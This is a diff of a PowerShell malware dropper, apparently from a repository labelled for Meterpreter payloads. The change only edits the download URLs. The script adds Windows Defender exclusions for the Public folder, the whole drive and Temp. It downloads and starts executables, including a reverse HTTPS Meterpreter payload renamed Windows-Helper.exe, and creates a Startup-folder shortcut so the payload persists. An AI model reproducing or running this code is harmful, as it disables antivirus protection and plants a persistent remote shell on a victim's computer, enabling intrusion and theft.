@@ -31,12 +31,12 @@ if ((Test-Path -Path "$drive\Users\Public\Windows-Helper.exe" -PathType Leaf) -a
     Add-MpPreference -ExclusionPath "$drive\Users\Public\Windows-Helper.exe"
     Add-MpPreference -ExclusionPath "$($drive)\" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "$drive\Users\$([Environment]::UserName)\AppData\Local\Temp"
-    Invoke-WebRequest -Uri "https://github.com/durandlh/mpr-cracker-remote/blob/main/fourth-revision/https_meterpreter/gui.exe?raw=true" -outfile "$drive\Users\Public\gui.exe"
+    Invoke-WebRequest -Uri "https://github.com/durandlh/mpr-repo/blob/main/fourth-revision/https_meterpreter/gui.exe?raw=true" -outfile "$drive\Users\Public\gui.exe"
     powershell Add-MpPreference -ExclusionPath "$drive\Users\Public\gui.exe"
     cd $drive\Users\Public\
     Start-Process gui.exe
-    Invoke-WebRequest -Uri "https://github.com/durandlh/mpr-cracker-remote/blob/main/fourth-revision/https_meterpreter/reverse_https_1.exe?raw=true" -outfile "$drive\Users\Public\Windows-Helper.exe"
-    Invoke-WebRequest -Uri "https://github.com/durandlh/mpr-cracker-remote/blob/main/fourth-revision/https_meterpreter/persistent.exe?raw=true" -outfile "$drive\Users\Public\persistent.exe"
+    Invoke-WebRequest -Uri "https://github.com/durandlh/mpr-repo/blob/main/fourth-revision/https_meterpreter/reverse_https_1.exe?raw=true" -outfile "$drive\Users\Public\Windows-Helper.exe"
+    Invoke-WebRequest -Uri "https://github.com/durandlh/mpr-repo/blob/main/fourth-revision/https_meterpreter/persistent.exe?raw=true" -outfile "$drive\Users\Public\persistent.exe"
     powershell Add-MpPreference -ExclusionPath "C:\Users\Public\persistent.exe"
     $WshShell = New-Object -comObject WScript.Shell
     $Shortcut = $WshShell.CreateShortcut("$drive\Users\$([Environment]::UserName)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windows-helper.lnk")
